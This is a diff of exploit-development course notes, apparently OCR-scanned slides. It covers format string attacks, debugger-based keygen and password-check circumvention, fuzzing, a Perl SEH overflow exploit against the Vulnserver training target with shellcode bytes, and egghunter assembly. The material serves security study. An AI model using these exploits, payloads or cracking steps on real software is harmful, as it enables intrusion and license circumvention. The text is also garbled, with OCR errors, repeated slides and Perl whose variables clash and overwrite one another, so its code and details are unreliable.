+		- If the programmer makes a math error, this null can be placed
+			outside of the buffer
+				Overwrites one byte of data with a null
+		- If we get lucky, this will overwrite the least significant bit In the
+		  stored EBP value on the stack
+				- Because of the epilog when the function completes, the EBP will
+				  end up as the stack pointer
+				- If the stack pointer now points to a memory region controlled by
+				  the attacker, we can place a "saved EIP" on the stack
+				- Our saved EIP will Jump to shellcode
+				
+	
+	Attacking Format Strings
+		
+		Introduction to Format Strings
+			- Newer class of security vuln
+			- Became public in 2000, but known about for much longer in the underground
+			- Same premise as the buffer overflow
+				- Take advantage of a weakness in C to write data to arbitrary locations
+				- Force redirection of execution to shellcode
+				- Compromise system when shellcode is executed
+				
+		Dissecting the Format String
+			- Format strings used by format functions(printf(), etc.)
+				- Takes a format string as an argument
+				- Takes in other arguments defined by the % character
+			
+			- The format specifier (%d for example) will print the next argument to 
+			  the function in a specific manner (as a decimal integer)
+			  
+		
+		Parameter Types
+			- The following parameters get data as values, not pointers to
+			  values:
+					%d - Dearnd
+					%u - Unsqned decirnd
+					%x - Hexadecimal
+			
+			- Two special format parameters:
+					- %s- format parameter expects to be grven a rnernory address and pmts
+					  the data at that memory a nul byte encountered
+					
+					- %n - Expects to given a mernory address and wraes number of
+					   bytes that have been written so far nto that rnernory address
+					   
+		
+		Using Format Function
+			- Functions such as printf() require expect that
+			  the same number of arguments are passed as
+			  format specifiers
+					But, this is left up to the programmer...
+			
+			- Format strings are laid out on the stack
+				
+					+--------------------------+
+					| Address of format string |                           
+					| Value of first arg       |                           
+					| Value of second arg      |                           
+					| Value of third arg       |                           
+					| Value of fourth arg      |                           
+					| Bottom of the stack      |                           
+					+--------------------------+
+		
+		Format String Vulnerability
+			- Format bugs arise because C's argument passing
+			  conventions are not type-safe.
+			- The varargs mechanism allows functions to accept
+			  any number of arguments (e.g. printf) by "popping" as
+			  many arguments off the call stack as they wish.
+			- It trusts the early arguments to indicate how many
+			  additional arguments are to be popped, and of what
+			  types.
+			  
+		Format String Vulnerability
+			- Format bugs arise because C's argument passing
+			  conventions are not type-safe.
+			  
+			- The varargs mechanism allows functions to accept
+			  any number of arguments (e.g. printf) by "popping" as
+			  many arguments off the call stack as they wish.
+			
+			- It trusts the early arguments to indicate how many
+			  additional arguments are to be popped, and of what
+			  types.
+			  
+		Format String Vulns
+			- When a format function is used without
+			  including the format specifier, we can exploit
+			  the string if input is controlled by the attacker
+					printf("hello") instead of printf("%s", hello)
+					Printf is passed the address of the string instead of the
+					address of the format string
+					Printf will iterate through the string and print each
+					character, so the program still works
+			- What if we send a format parameter (%s) in the string?
+			
+		
+		Insert a Malicious Format Parameter
+			
+			- The format function (printf) expects a format
+			  parameter
+					- If printf gets a format parameter, it will attempt to read
+					  the appropriate argument by adding to the frame
+					  pointer.
+					- If there is no argument, adding to the frame pointer will
+					  reference a piece of memory in a preceding stack frame.
+					  
+		
+		Reading the stack
+			
+			- By inserting many format parameters, the entire contents of the stack can be read
+					- This can include sensitive information (passwords, encryption keys, TS data, etc.)
+					- Read data from other processes or programs
+					- Used to determine running state of application that could make remote exploitation easier
+					
+		Reading Arbitrary Memory Addresses
+			
+			- A clever attack is possible with the %s parameter
+				- The user inputted format string s stored on stack
+				- Inserting many parameters will cause the user inputed format string to
+				  read itsetf.
+			
+			- In this situation, you are supplying the format string AND
+			  reading the user supplied format string stored on the stack
+				- Now you can supply an address me %s parameter remember the %s
+				  parameter expects to be given a memory address and prints the data
+				  at that memory address until it finds a null.
+				- Any address we supply can now be read, provided it does not contain a
+				  null
+				- Caveat- most Windows program are loaded at 0x004000, so on
+			 	  Windows you can only read DLLS. crypto keys, user stack data, etc
+				  
+		Example:
+			
+			- Program compile
+				>$ gcc formatvuln2.c -o formatvuln2
+				>$ ./formatvuln2 testing
+					testing 
+					test—val @ 0x08049534 = —72 0xffffffb8
+				
+			- In the first command, the last %08x reads the AAAA
+			  from the stack.
+			- The second command takes AAAA as a string pointer
+			  and reads from there (crashes)
+			- Last command passes bfffffaba as a valid address
+			  and reads till a null is found
+			  
+				- . /formatvuln AAAA%08x%08x%08x%08x
+				- . /formatvuln AAAA%08x%08x%08x%s
+				- . /formatvuln 'printf "\xba\xfa\xff\xbf"' AAAA%08x%08x%08x%s
+				
+		
+		Writing to addresses
+			
+			- If we can read an address, we can write to an address using the %n
+				- Refresher - the %n writes the number of bytes that have
+				  been written so far
+				  
+				- To do this attack we need to control the number of bytes written
+					The %u will output a defined number of bytes (eg % 100u	outputs 100 extra bytes)
+					
+		
+		Example:
+			
+			- Reading value of 0x08049534:
+				
+				./fornatvuln2 'printf "\x34\x95\x04\x08"' %x%x%x%x
+				
+			- Write to that value with a %n:
+				
+				./fornatvuln2 'printf "\x34\x95\x04\x08"' %x%x%x%n
+		
+		
+		Address Writing Complications
+			
+			- Writing a full 32bit address can be problematic, as this would have to be a large number of outputted
+			  bytes
+					In the wild, outputting an address 0x081c5600 is difficult
+					
+			- A better strategy is to simply write one byte at a time
+			- First, write the first byte in the address
+			- Then, increment the address to be written by one
+			- Write the next address
+			- Repeat...repeat
+			
+		Controlling Number of Bytes Written
+			
+			- We can value written by changing the number of bytes written out prior to the %n being used:
+			
+				./fornatvuln2 'printf "\x34\x95\x04\x08"' %08x.%08x.%08x%n
+				
+		Executing Shellcode
+			
+			- Store shellcode in memory (perphaps even in original format string)
+			
+			- Overwrite an address that gets put into EIP with address of shellcode
+				- return pointer
+				- .dtors - executes when program exits, so when program exits address is overwritten to execute shellcode
+				- Global Offset Table (GOT) Table of all function, simply overwritten a function that calls a GOT entry
+				  from the Procedure Linkage Table (PLT)
+
+Module #05
+	Finding Vulnerability with Debuggers
+	> Debuggers
+	> Hardware vs. software breakpoint
+	> Keygens
+	> Attacking keygen algorithms
+	> Protections against these attacks
+	
+	Debuggers
+		> Debuggers allow for a program to be halted at a specific address
+			- Allows the user to take control
+			- change values in registers
+			- change/control execution of program
+		
+		> This is done via breakpoints
+			- can be hardware or software based
+			
+		> Combined with a disassembler, a debugger is all that is need to circumvent copy protection
+		
+		> Software breakpoints
+			- Replaces a program instruction with a trap, illegal divide, or some other instruction that will cause an exception
+			- Typically 0xCC
+			- An unlimited number of software breakpoints can be created
+			
+		> Software breakpoints can be detected
+			- Because they modify the program
+			- CRC functions and encryption can check instructions
+			- Not possible on ROM
+		
+		> Hardware breakpoints
+			- Hardware breakpoints are available as a builtin debugging features in modern processors.
+			- Dedicated registers into which the breakpoint address may be stored.
+			- When EIP matches an address in DR0-DR7 the CPU raises an exeption and reports it to the debugger.
+			- X86 chips have 4 hardware debuggers available
+			
+		> Consequence - if a debugger can't make a software breakpoint, it can only set a finite number of 
+		  breakpoints depending on the processor
+	
+	Why Use a Debuggers
+		> Many protection scheme obfuscate passwords
+			- Stuff them in a nondescript file
+			- Place thousands or million of invalid passwords along with the password
+			- Code in unicode, do an XOR operation or even encrypt passwords
+			
+		> Dissembling and manually searching for passwords in this method is difficult and even impossible
+		
+	Keygens
+		> Software pirates "prize" is creating the keygen
+		> A keygen automatically generates a valid key
+			- Thorough analysis of algorithm
+			- Results in a keygen
+			- Prized by	crackers because it	takes lots
+			  Of skill in asm and reversing to create keygen
+			- Keygens are usually valid for	short period of
+			  time
+	
+	Avoiding the Keygen
+		> In reality, creating a keygen is more of an
+		  "academic" exercise
+		> Much better ways to circumvent key
+		  generator protection
+			• Attach a debugger to running process
+			• Enter in invalid key or password
+			• Search for where this buffer is stored in memory
+		
+		> Once you know where the key is stored in memory, we can assume that 
+		  it must be passed to the key generator algorithm
+		
+	Circumventing the "Keygen" function
+		> After passing a pointer to the buffer where the
+		  invalid key is stored to the keygen function, the
+		  results are usually checked by some sort of
+		  comparison operation
+			- Can be a strcmp, if, any other type of
+			  familiar logic
+			- Simply set a breakpoint on the address of
+			  this buffer
+			  
+		> To circumvent the checking we have many options --- all
+          involve shortcutting the key generator function
+			- Replace the jump with NOPs
+			- Change the value checked by a test instruction 
+			  (make EAX non zero)
+		
+	Complications
+		> Many complications to this method
+			- Even if protection developer is not
+			  attempting to make the cracker's life
+			  difficult we still have problems
+			- The program or OS can copy the
+			  buffer into many different locations
+			  (heap, stack, etc.)
+			- A memory search can result in tens 
+			  or even hundreds of addresses
+			  
+		> Protection developers can smear the buffer all over memory
+			- Intentionally copy the buffer into hundreds of locations
+			
+	Protection Against this Attack
+		> Other opportunities for protection
+			- Once we know that crackers look for the address of where 
+			  invalid key is stored in memory, and then set a
+			  breakpoint on it...
+		
+		> Don't analyze the data immediately after it is received from 
+		  the protection function
+			- Pass it as an argument to several functions
+			  that do something with it, then transfer it to
+			  other functions.
+			- These functions, in turn, transfer it to the
+			  following ones.
+			- Finally the check is made
+			
+		> This method is not full proof, but wil result In many, many hours of extra 
+		  work for even skilled crackers
+		  
+	SoftIce
+		> Softlce is by far the most popular debugger for crackers
+			- SoftICE is a suite of the core device driver
+			  tools that accelerate the development and debugging
+ 			  of Windows device drivers.		
+			- Produced by CompuWare
+			
+		> Supports powerful breakpointing and tracing
+			- Breakpoints can be set on library functions
+			  and windows messages
+			- You can seamlessly follow execution from
+			  your Win32 application into system DLLs
+			  and then into the kernel and back.
+			- Breakpoints can be set in the kernel or
+			  standard device drivers and then step up
+			  into a standard program (Explorer)
+			  
+	Basic Softlce Usage
+		> You can trace through a program using the F8
+		  key or the T command
+			- F10 will do the same thing but will 
+			  "step over" any Win32 API call
+			- The debugger will return control to user
+			  after function call is complete
+			- Nice because we don't have to needlessly
+			  wade through API calls
+		
+		> Setting breakpoints
+			- F7 or U will set a "one shot" breakpoint at
+			  highlighted instruction only set once,
+			  then removed
+			- Set breakpoints on Windows API with bpx
+			  GetWindowTextA, etc.
+			- List breakpoints: BL
+			- Clear breakpoints: BC *
+			- Return out of a function, to where it was
+			  called with: P RET
+			  
+	
+Module #6 Using a Disassembler
+	
+	Using a Disassembler
+	
+	Binaries?
+		- During many pen tests, you are likely to encounter many
+		  situations where you have to analyze or modify a binary
+			- Discover a hidden passphrase
+			- Find textual comments
+			- Circumvent password authentication
+			- Circumvent copy protection controls
+			- Discover vulnerabilities in closed source software
+			- Determine the function and runtime nature of a program
+			
+	Disassemblers
+		- A disassembler takes machine code and
+		  translates it into human readable assembly
+		  code
+		- From here, higher level language constructs
+		  can be discovered (if, else, for, switch,etc.)
+		- Commonly used in reverse engineering
+		- Many drawbacks to disassembly
+			- Can be difficult to understand
+			- All comments, variable names, etc are gone
+			- Compilers can do strange things
+			- Optimizing compilers are even worse
+			
+		- Many tools that can do disassembly on the market:
+			- Dumpbin
+				Comes with Visual Studio
+				Supports raw and disassembled dumps
+			- Hiew
+				Hackers vlEW
+				Still very With software crackers
+			- WinDASM
+				Used to be the "default" disassembler before IDA
+			- IDA Pro
+				Interactive disassembler, auto-recognizes compilers
+			- Ollydbg
+				Shareware Win32 disassembler
+-------------------------------------------------------------------------	IMP for reference			
+	Disassembling Binaries
+		
+		- Windows Portable Executable (PE) binary has many 
+		  possible sections:
+			
+			bss: uninitialized data.
+			crt: runtime library initialization/shutdown pointers.
+			data: initialized data.
+			debug: COFF debug information data.
+			edata: exported functions data.
+			idata: imported functions data.
+			rdata: read only data.
+			reloc: base relocations data.
+			rsrc: resource data.
+			text: machine code.
+----------------------------------------------------------------------------
+	
+	Hardcoded Data
+		
+		- The easiest thing to do with a disassembler is find hard coded data
+			- Same methods are also used to reverse binaries to find secunty bugs
+			  Look for bugscan for IDA
+		- Hardcoded Passwords can be stored in any of the sections
+		  in a binary. Most likely found in the .data section
+		- Simply using a disassembler, you can find the password if it
+		  is stored in ASCII printable characters
+		  
+	Modifying Binaries
+		
+		- Password authentication is usually accomplished via some
+		  type of string comparison:
+			if (strcmp (&buff [01, PASSWORD))
+			
+		- If a password is determined to be valid by a complex
+		  algorithm (think cd-keys) reversing the functionality to
+		  generate valid passwords can be prohibitively difficult
+			- Somewhere the program must do a strcmp to compare user Inputted data
+			  Idea is to find the section of instructions generated by the string
+			  comparison
+			- How do we get there? Programs are big!
+			
+	
+	Find the Address of Checking Function
+		- The first step is to find the address of the password checking
+		  function
+		  
+		- When this function is discovered, we can trace back to the
+		  comparison instructions and change them
+			- The address of the companson function should be pushed onto the stack
+				-- as an argument to the strcmp functjon
+			- The other value(s) pushed onto the stack should be the user entered
+			  value
+			- Now the companson function is called With a call
+			
+		
+		00401045: push 406040h
+		0040104A: lea edx, [ebp-68h]
+		00401040: push edx
+		0040104E: call 004010A0
+		
+	
+	Discovering the Comparison Results
+		- No need to worry about how the user inputted string is determined
+		  valid or not
+		- A comparison operation should have some sort of test instruction
+		  followed by a conditional jump
+		- In this case, the program checks to see if eax is zero, if it is it jumps
+		  to a specific address:
+			
+			00401056: test eax, eax
+			00401058: je 00401069
+		
+		- Does a zero in EAX mean you have a valid or invalid password?
+		- Note: We will come back to these instructions and modify them to
+		  change the password checking behavior of the program
+		  
+	
+	Determining the Branching Structure
+		
+		- Where does the non-zero eax (je failed) branch to?
+		
+		- 0040105A: push 406050h
+		  <many lines>...
+		  00406050: Wrong password..
+		  
+		- What about a zero eax?
+		
+		- 00401081: push 406060h
+		  00401086: call 00401234
+		  00401234: Password 0K
+		  
+	Editing The Binary
+		- The goal is to remove password authentication so we can
+		  access the program
+		- A requirement is that the number of instructions in the
+		  program does not change
+			- All pointers and hard coded address will be off If the number of
+			  instructions is more or less than the original
+			  
+		- We can drastically change the functionality of the program by
+		  flipping a few bits.
+			- How about a jne instead of a Je?
+			- Or a the familiar xor instead of test?
+			
+	
+	Fuzzing and Fault Injection
+		- Fault Injection or Fuzzing is the process of automatically generating 
+		  variety of bad or, faulty, input to a program 
+			- Hope that this bad input will be "good"
+			  enough to be accepted as valid input
+			- But still cause an unexpected behavior
+			  or crash in the program
+			- Automated black box testing
+			
+		- The term "fuzzing" comes from bisync modem days
+		- Interference on the line or "fuzz" sometimes caused
+		  unexpected data to be inputted to a modem
+		- Caused software failures, sometimes even security
+		  related failers
+		  
+	Famous Fuzzers
+		
+		- Some better known C language fuzzers
+			- Dr. Miller's Fuzz project at UW-Madison
+			- PROTOS from U-Ou1u
+			- SPIKE
+			- Sharefuzz
+			- Cenzic's Hailstorm
+			- CHAM module in Retina
+			
+		- Lots of web language fuzzers
+			- SPI WebInspect
+			- Sanctum
+			- SPIKE Proxy
+			- Nikto
+			
+	Pros and Cons
+		Why fuzz?
+			- Easy (only?) way to generate lots Of bad input
+			- Only automated way to find vulns in binaries when you don't have source
+			— reversing binaries is difficult
+			- Fuzzers can surprise you find bugs that you may never think to look for
+			  RFC protocols offer opportunity to build a fuzzer that works against 
+			  many systems (SMTP, HTTP, etc.)
+			  
+		Fuzzer downfalls
+			- Only work when you can generate valid input
+			- Invalid input will be rejected (eg ascii printable)
+			- Not possible to "reach" every	possible bug via an algorithm.
+			- Not every security bug triggers an exception or program crash
+			- Can be prohibitively difficult to reverse engineer a proprietary protocol (MS RPC)
+			
+	Manual Fault Injecting
+		- The simplest fault injector is a person sending bad input to an
+		  applicatoin.
+		  
+		- On an ftp server:
+			- Throws format string characters at username, password fields
+			- Long strings of all different	encodings at get, put, chmod,
+			  etc.
+	
+	
+	Writing a Fuzzer
+		- Many security researchers build a specific fuzzer for each 
+		  application to be tested
+		
+		- Usually a perl script that sends valid but random input to a specific 
+		  area where user input is allows
+			- Example, STAT globbing on	Microsoft's FTP Server has a DoS
+			  condition
+
+		- Can be found using a perl script:
+			- #build a string consisting of random
+			  #sequence of the glob character array
+				for (1..$len)
+				{
+					$result .= $globs[int(rand() *scalar(globs))];
+				}
+				
+		- A good strategy for building a fuzzer
+			- Find an existing vulnerability in a program that uses an RFC-defined
+			  protocol for communication
+			- Build a fuzzer that reliably re-discovers this vulnerability
+			- Attack other similar programs that use the sarne implementation of the
+			  protocol
+			  
+		- If you use this to model vulns found in heavily audited software (Apache, IIS, etc.) 
+		  you can often find similar bugs in less audited software (Compaq Insight Manager, IOS HTTP Daemon, etc.)
+		  
+		- Other strategies for creating fuzzers:
+			- If the server you are attacking is complicated, modify an open source
+			  implementation of the client portion of it
+			- Samba is a good example to attack	CIFS/SMB
+			- Have it send longer query strings, strings with different data
+			- Good for attacking detailed checksum routines and anti-reverse
+			  engineering schemes
+			- Attempt to generate faults for underlying protocols (ASN.I) to see
+			  if they surface on higher level ones
+			  
+	Advances In Fault Injection
+		- New fuzzers will attack every field in an entire protocol
+		- Hit every field in HTTP request:
+			- GET, HEAD, POST, etc.
+			- Accept:
+			- Accept—Language:
+			- User—Agent:
+			- Host:
+			- Connection:
+			- Cookie:
+		- The problem becomes, how to put in valid data, that will "reach" vulnerable
+		  areas of the program?
+		  
+	Smart Content
+		
+		- One method is to use smart content
+			- Create a valid client to server
+			  request, or server to client response
+			- Use surrounding bytes in request to
+			  increase the size of various fields
+			  
+		- In this way a HTTP GET request would be
+		  fuzzed as (hoping for an overflow):
+			- GET
+			- GETT
+			- GETTT
+			- GETTTT
+			- GETTTTT
+			- GETTTTTT
+			
+		- Why use smart content?
+			- Many fuzzers are blocked at data-type checking routines (islower(), isascii(), etc.)
+			- In order to get past these checks, valid data needs to be sent
+		
+		- A variation on this is to look for delimiting characters, and then fuzz
+		  around them
+			- Delimiting characters such as the space, /, ., ?, =, \,|, etc.
+			- More likely to find a vulnerable input area that is copied 
+			  into a buffer in this manner
+			  
+		- GET / search.ida?group=kuroto&q=riot
+		  HTTP/1.1
+	
+	Attacking Complicated Protocols
+		- Fuzzing HTTP is relatively easy
+			- We only have to worry about the Content—Length: and maybe some
+			  others to make a valid HTTP request
+			  
+		- What about an undocumented binary protocol? Or a secure protocol?
+		- Best method for attacking these protocols is to "flatten out" 
+		  the protocol stack.
+		- Process is:
+				- Discover interdependencies between protocol elements
+				- Isolate area to be tested
+				
+
+# SEH based buffer overflow exploit
+	
+	SEH Exploit Workflow
+		- Is It exploitable?
+		- Can we overwrite the exception handler?
+		- What SEH exploit mitigations are in place?
+		- Can we bypass them?
+		- Bypass them.
+		
+	SEH exploitation difference
+		- Very similar to vanilla buffer overflows with a few caveats
+		- The vulnerability we will be discussing
+			- The GMON command of Vulnserver.
+		- GMON command with a parameter consisting of a very
+		  long (—4000 characters or more) string including at least
+		  one forward slash (/) character.
+		  
+	GMON POC Script
+	#!/usr/bin/perl
+	use IO::Socket;
+	if ($ARG[1]eq"){
+			die("Usage: $0 IP_ADDRESS PORT\n\n");
+	}
+	$badatta="GMON/"; #sets variable $dabatta to "GMON /"
+	$baddata="A" x 4000; #appends(.=)4000"A"characters to $baddata
+	$socket=IO::Socket::INET->new(#setup TCP socket-$socket)
+			Proto=>"tcp",
+			PeerAddr=>"$ARG[0]",#command line varibale 1 - IP Address
+			PeerPort=>"$ARG[1]" # command line variable 2 - TCP port
+	) or die "Cannot connect to $ARGV[0]:$ARGV[1]";
+	$socket->recv($sd, 1024); #receive 1024 bytes data from $socket, store in $sd
+	print"$sd";#print $sd variable
+	$socket->send($baddata); #send $badatta variable via $socket
+	
+	
+	How to tell if SEH is involved
+	
+		EIP == 77C460C1
+		
+		
+		- The EIP register does not point to an address made up of bytes taken from within the data we sent
+		- hex equivalent of the ASCII character "A", which is \x41. what will Happen if we 
+		  allow  the debugger to handle this error through?
+		
+		
+		- Pass exceptions through to the debugged program. 
+		  what happens?
+		
+		EIP == 41414141
+		
+	What happened nere
+		- EIP points to 41414141
+			Our "A" 's
+			Access violation when executing code at that address.
+		
+		- Reproduces a stack overflow that has overwritten a return
+		  address stored on the stack
+		- Why did we only gain control of EIP only after we allowed the
+		  program to handle the first exception?
+		  
+	Structured Exception Handling
+		- A method that the Windows Operating System uses to allow
+		  Its programs to handle serious program errors
+		  
+		- Basically, what It provides Is a way of specifying addresses
+		  of exception handling routines
+		  
+	Structured Exception Handling
+		- Windows exception handling routines are called
+			- The Operating System will attempt to pass control of the programs execution
+			  to code located at the addresses specified In the SEH list
+			  
+			- Starts at the first entry and moving through the list until control Is
+			  successfully passed.
+			  
+		- Usually displays a dialog box that tells the end user that the program has
+		  experienced an exception, and terminating the application.
+		  
+		- Additional reading:
+		http://web17.webbpro.de/index.php?page=windows-exception-handling
+		https://msdn.microsoft.com/en-us/library/ms680657%28v=VS.85%29.aspx
+		
+		- Given that the SEH entries are stored on the stack
+		- In the case of a program having a stack overflow vulnerability we sometimes
+		  have an opportunity to overwrite the programs SEH entries with pointers to
+		  our own code
+		- Allow us to take control of programs execution.
+		- We can view SEH chains In ollydbg:
+		
+			
+		Address   SE handler						Address   SE handler	
+		000022FF  nsook.7c8399F3					000022FF  414141
+		000022FF  kernel32.7c8399F3  
+			
+			Unaltered								SEH chain after we run
+			SEH chain								our exploit
+			
+			
+	Controlling SEH chains
+		- We have control of the SEH entry, which Is used as an address to redirect
+		  code to after an exception has occurred.
+		 
+		- This gives us a pathway towards control of the EIP register
+		
+		- There are a number of exploit prevention mitigations added to SEH 
+		  handler by microsoft that we need to work around first
+		  
+	SEH Exploit Mitigation Techniques
+		- Methods of mitigating exploits In SEH chains:
+			- Zeroing of CPU registers
+			- SEHOP
+			- SafeSEH and NO_SEH
+		- Zeroing CPU Registers
+			- We can't use registers
+			- Deny an exploit writer from using these registers as a pointer to an area of code which he controlled.
+			- JMP ESP would fail, ESP would be 00000000
+		- Not a problem
+	
+	SEHOP
+		SEHOP
+		- Checks to see that the SEH chain appears intact
+		- The SEH chain is essentially a linked list of addresses
+		- Each entry in the chain contains the address of the next SEH entry immediately before the
+		  exception handler address.
+		- If SEHOP was enforced, this would not be a valid SEH Chain, and the Exception
+		  Handler would not pass control to any of the entries with this list in this state.
+		  
+	Bypass SEHOP
+		
+		- To bypass SEHOP, you need to onstre that the SEH chain appears to be complete.
+		- SEHOP considers a SEH chain as one that
+			Starts from the entry specified in the TIB
+			Correctly chaining through an unspecified number of other entries to the final entry in
+			the chain
+		
+		- the final entry in a SEHOP validated chain
+			FFFFFFFF as the "next entry" address
+			ntdll!FinalExceptionHandler as the handler address
+			
+		Not relevant in this case
+	
+	SafeSEH and NO SEH
+		- SafeSEH Is a linker option
+			- Specifies a particular list of addresses from that module as SHE
+		
+		- A related option Is NO_SEH. If a module has the
+			IMAGE_DLLCHARACHTERISTICS_NO_SEH flag set in the 
+			IMAGE_OPTIONAL_HEADER structure, then addresses from that module
+			cannot be used as SEH exception handlers
+			
+		- The important things realize
+			- THey are used to limit the potential addresses that the SEH will accept as 
+			  valid handler addresses to be used to redirect code execution.
+			  
+	Exploiting SafeSEH
+		The following strategies are availaNe to us when atternr*ing to bypæs this feature:
+			
+		1. Use an overwrite address from a module loaded by the target that was not
+		   compiled with the NO_SEH or SafeSEH options.
+		2. Try and make use of the excepUon harxiling code within a SafeSEH enabled module to
+		   fulfill your exploitation goals.
+				Unlikely
+		3. Use an address from the heap that contains either your shellcode or instructions that 
+		   will allow you to redirect to your shellcode.
+			Influence the contents of large sections of heap memory
+			
+		4. Use an overwrite address from a predictable spot In memory, marked executable, that
+		   sits outside the area of loaded modules in scope for the SEH verification tests.
+		   
+		Out of all of these bypass method, #1 is the simplest, so we will discuss this next
+		
+	Finding SEH Overwrite Addresses
+		- The first, and easiest method, Involves using the OllyDbg
+		  plugin OllySSEH to find these modules
+		- Let's try using the OllySSEH plugin:
+		
+		- Those modules In red have been compiled without either the 
+		  SafeSEH ON switch or the NO_SEH option.
+	
+	Picking an Overwrite Address
+		- The goal of using  an overwrite address is to redirect execution of the CPU to some 
+		  code that we can use to fulfill our exploitation goal.
+		  
+			- None of the CPU registers point to anywhere near our buffer
+			- Use of the registers to redirect code execution is out.
+			- On the stack : The third entry down from our current position 
+			  points to a long string of "A" characters.
+			- This is likely to be within the data we sent to overflow the buffer!
+		
+		
+	Viewing the stack
+		- Next SEH record and SE Handler all A's
+		- If we can find a way to redirect code execution to the address specific by third 
+		  entry on the stack, we will land within the block of data sent to cause this overflow.
+		- All we need is to POP the top two entries from the STACK and RETN on the third entry
+		  Within our module essfunc.dll
+		  
+	Gaining control of execution
+		- Take the POP, POP, RET address we found earlier
+		- Insert It Into our skeleton exploit
+		- Add Int 0x03
+		- Confirm that we can take control of code execution	
+	
+		- This will allow execution to automatically pause In the debugger once It Is 
+		  redirected to this location. Next screen shows the new exploit, changes In red
+		  
+		
+	#!/usr/bin/perl
+	use IO::Socket;
+	if ($ARG[1]eq"){
+			die("Usage: $0 IP_ADDRESS PORT\n\n");
+	}
+	$badatta="GMON/"; #sets variable $dabatta to "GMON /"
+	$badatta.="\xCC"x3498;#appends(.=)3498"CC"characters to $badatta
+	$baddata="\xEB\x0F\x90\x90"; #JMP OF, NOP, NOP
+	$baddata=pack('V', 0x625010b4); # SEH overwrite, essfunc.dll, POP EBX, POP EBP, RET
+	$baddata="\x59\xFE\xCD\xFE\xCD\xFE\xCD\xFF\xE1\xE8\xF2\xFF\xFF\xFF";
+	$baddata="\x90" x (4000-legth($badatta)); #data after SEH handler
+	$socket=IO::Socket::INET->new(#setup TCP socket-$socket)
+			Proto=>"tcp",
+			PeerAddr=>"$ARG[0]",#command line varibale 1 - IP Address
+			PeerPort=>"$ARG[1]" # command line variable 2 - TCP port
+	) or die "Cannot connect to $ARGV[0]:$ARGV[1]";
+	$socket->recv($sd, 1024); #receive 1024 bytes data from $socket, store in $sd
+	print"$sd";#print $sd variable
+	$socket->send($baddata); #send $badatta variable via $socket
+	
+	
+	Add Shellcode
+		- Where should we place our final section of shellcode?
+		- Since we are Jumping backwards 768 bytes from the end of the CALL statement
+		  at the end of our small block of shellcode
+		  Sizeof block of Int 3 - 768- length of the data between
+				End of the small shellcode
+				End of the block of INT3 Instructions
+	
+	22 bytes in length.
+	768 - 22 =746.
+	My value for the size of the INT3 block of characters (determined when we ran pattern_offset earlier) was 3498.
+	Subtracting 746 from 3498 makes 2752
+	
+	
+# Egghunter Shellcode
+	
+	Module Overview
+		
+		What are egghunters?
+		Why do we need them?
+		Notable egghunter code
+		How do we go about it?
+		Complex you say?
+			Omeletes for everyone.
+			
+	
+	
+	What are egghunters?
+		Searching through memory
+		Find a Herring
+		Do something
+			Direct execution
+			Copy memory
+			
+	Why do we need them?
+		Payload area too small for a payload
+			Multiple connections
+			Payload fragmentation
+	
+		An egghunter is like a springboard
+	
+	Notable eggnunter code
+		Skape's egghunter
+			http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
+			http://www.hick.org/code/skape/shellcode/win32/egghunt_syscall.c
+			
+		Skypher's Omelete hunter
+			http://code.google.com/p/w32-seh-omelet-shellcode/source/browse/trunk/w32-shellcode.asm
+	
+	How do we go about it?
+		Get shellcode In to memory
+		Overwrite/Steal EIP
+		Use the egghunter
+			Redirect EIP to code
+			Copy to RWX
+		Use the shellcode
+	
+	Scenario
+		Symptom
+			You have an overflow
+			You built your ROP chain
+			Your payload doesn't trigger properly
+			An Int Ox03 does
+		
+		Problem
+			You ran out of space
+			
+		Solution
+			BackwardsJump
+			Egghunter
+			Both
+			
+	Scenario diagram
+		 -----------------------------------------------------------
+		|	                ------------------------------------    |                         
+		|					|	 ___________________________	|	|	
+		|					|	| 69 bytes area w/NOP sleed	|	|	|						
+		|					v	|		|					|	|	|
+		|	2. Jumpcode lands on|		|					|	|	v
+		|		NOP sled		|		|					|	^  4. Egghunter finds search 
+		|	3. Execution slides |		v					|	|     string, passes control to egg
+		|		off NOP sled hit|	egghunter				|	|                            ---------------
+		|		egghunters     	|							|	|							|Separate		|
+		|			|			|							|	|							|memory area w/ |
+		------------			|___________________________|	|							|Search string	|
+				1. JMP ESP lands|  EIP Overwrite			|	|							|Egg shellcode	|
+					here		|___________________________|	|							|				|
+					|			| 20 byte area w/ Jumpcode	|	|							|				|
+					|			|___________________________|	|							 ---------------
+					|											|			
+					---------------------------------------------
+					
+					
+	Example of usage
+		Connection one stages shellcode
+			Somewhere in memory
+			We don't know where
+			Herring on the front
+		Connection two steals EIP/runs egghunter
+			Iterate over memory
+				Catch access violation
+			Check for herring
+				Execute
+				Copy
+				
+	Examining the egghunter
+		[BITS 321] ; Matt Millers (skapes) syscall egghunter
+		global _start loop_inc_page:
+				or dx, 0x0fff ; Add PAGE_SIZE-1 to edx loop_inc_one:
+				Inc edx ; Increment our pointer by one
+		loop_check:
+				push edx ; Save edx
+				push byte 0x2 ; Push NtAccessCheckAndAuditAlarm
+				pop eax ; Pop Into eax
+				Int 0x2e ; Perform the syscall
+				cmp al, 0x05 ; Did we get 0XC000000s (ACCESS_VIOLATION)
+				pop edx ; Restore edx
+		loop_check_8_valid:
+				je loop_inc_page; Yes, Invalid ptr, go to the next page
+		is_egg:
+				mov eax, 0x5433334c ; Save egg
+				mov edi, edx ; Set edi to the pointer
+				scasd ; Compare the dword In edi to eax
+				Jnz loop_inc_one ; No match? Increment
+				scasd ; Compare the dword In edi to eax Jnz
+		loop_inc_one ; No match? Increment
+		matched:
+			Jmp edi
+			
+	
+	This all seems really manual
+		
+		Sort of...
+		Metasploit has egghunter support via a mixin:
+			https://community.rapid7.com/community/metasploit/blog/2012/07/06/an-example-of-egghunting-to-exploit-cve-2012-0124
+		Could this get any more complicated?
+			Why yes it could 
+	
+	Omelete Egghunters
+		Split up payload/egg chunks
+		Egg hunter recontructs chunks
+		Direct EIP to payload
+	
+	Eggnunter ReconstructsChunKs
+		Define eggs
+		Set up exception handler
+		Find each egg
+			Copy to correct place
+			Reset exception handler
+		Redirect to assembled
+	
+	Getting ready
+	BIT 32
+		; egg:
+		; LL || MI M2 M3 DD DD DD ... (LL * DD)
+		; LL == Size of eggs (same for all eggs)
+		; II == Index of egg (different for each egg)
+		; MI,M2,M3 == Marker byte (same for all eggs)
+		; DD == Data in egg (different for each egg)
+		
+		marker equ Ox280876
+		egg_size equ Ox3
+		max_index equ Ox2
+		start:
+			XOR EDI, EDI;
+		jmp SHORT reset _ stack;
+		
+	Create the SEH Handler
+		
